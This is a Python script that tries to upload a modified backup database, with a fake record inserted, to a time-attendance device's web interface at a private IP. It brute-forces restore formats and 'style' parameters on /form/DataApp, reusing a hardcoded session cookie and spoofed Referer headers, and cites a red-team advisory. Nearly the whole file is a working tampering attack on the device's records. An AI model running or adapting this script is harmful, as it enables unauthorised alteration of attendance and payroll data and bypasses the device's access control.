"""Final web restore attempt - exactly as Webserver 3.0 manual describes"""
import os
import sys
import io
import gzip
import sqlite3
import requests
import urllib3
urllib3.disable_warnings()

sys.stdout.reconfigure(encoding='utf-8')

DEVICE_IP = '172.16.254.202'
BASE_URL = f'http://{DEVICE_IP}'
WORK_DIR = r'D:/chamcong/zk_fw_attempts/web_restore_test'

# 1. Use existing modified backup (1 fake record already inserted)
gz_path = os.path.join(WORK_DIR, 'modified_business.dat.gz')
if not os.path.exists(gz_path):
    print(f'Missing {gz_path}, regenerate...')
    sys.exit(1)

with open(gz_path, 'rb') as f:
    gz_data = f.read()
print(f'Payload ready: {len(gz_data)} bytes')

# 2. Try the EXACT format from redteam advisory / webserver 3.0 manual
# POST /form/DataApp with style=1 in form body (URL encoded), gets backup
# So restore is probably similar style with file upload

print('\nTest EXACT webserver format:')

# First confirm GET still works
r = requests.get(f'{BASE_URL}/form/DataApp?style=1', timeout=10)
print(f'GET ?style=1: status={r.status_code}')

# Try POST with form-encoded style=1 first (same as GET backup)
r = requests.post(f'{BASE_URL}/form/DataApp',
                  data='style=1',
                  headers={'Content-Type': 'application/x-www-form-urlencoded',
                          'Referer': f'{BASE_URL}/form/Device?act=11',
                          'Origin': BASE_URL,
                          'Cookie': 'SessionID=1624553126'},
                  timeout=8)
print(f'POST style=1 form: {r.status_code}, len={len(r.content)}, head={r.content[:30]!r}')

# Try raw POST with Content-Type=application/octet-stream and a fake filename header
r = requests.post(f'{BASE_URL}/form/DataApp',
                  data=gz_data,
                  headers={'Content-Type': 'application/octet-stream',
                          'Content-Disposition': 'filename="businessData.dat"',
                          'Cookie': 'SessionID=1624553126',
                          'Referer': f'{BASE_URL}/form/Device?act=20'},
                  timeout=15)
print(f'POST raw with filename: {r.status_code}, len={len(r.content)}, head={r.content[:60]!r}')

# Try with multipart file field 'file' (most common restore pattern)
files = {'file': ('businessData.dat', gz_data, 'application/octet-stream')}
r = requests.post(f'{BASE_URL}/form/DataApp', files=files,
                  headers={'Cookie': 'SessionID=1624553126',
                          'Referer': f'{BASE_URL}/form/Device?act=20'},
                  timeout=15)
print(f'POST multipart file: {r.status_code}, len={len(r.content)}, head={r.content[:60]!r}')

# Try style=3 / style=4 (restore params in some ZK firmware)
for style in ['3', '4', '5', 'restore', 'Restore']:
    try:
        r = requests.post(f'{BASE_URL}/form/DataApp?style={style}',
                          data=gz_data,
                          headers={'Content-Type': 'application/octet-stream',
                                  'Cookie': 'SessionID=1624553126'},
                          timeout=8)
        print(f'POST style={style}: {r.status_code}, len={len(r.content)}, head={r.content[:40]!r}')
    except Exception as e:
        print(f'POST style={style}: err {type(e).__name__}')

# Try the ones we already discovered work for backup (style=1,2) but POST
for style in ['1', '0', '2']:
    try:
        r = requests.post(f'{BASE_URL}/form/DataApp?style={style}',
                          data=gz_data,
                          headers={'Content-Type': 'application/octet-stream'},
                          timeout=8)
        print(f'POST ?style={style} raw: {r.status_code}, len={len(r.content)}, head={r.content[:40]!r}')
    except Exception as e:
        print(f'POST ?style={style} raw: err {type(e).__name__}')

print('\nVerification:')
r = requests.get(f'{BASE_URL}/form/DataApp?style=1', timeout=10)
print(f'GET ?style=1 after: status={r.status_code}')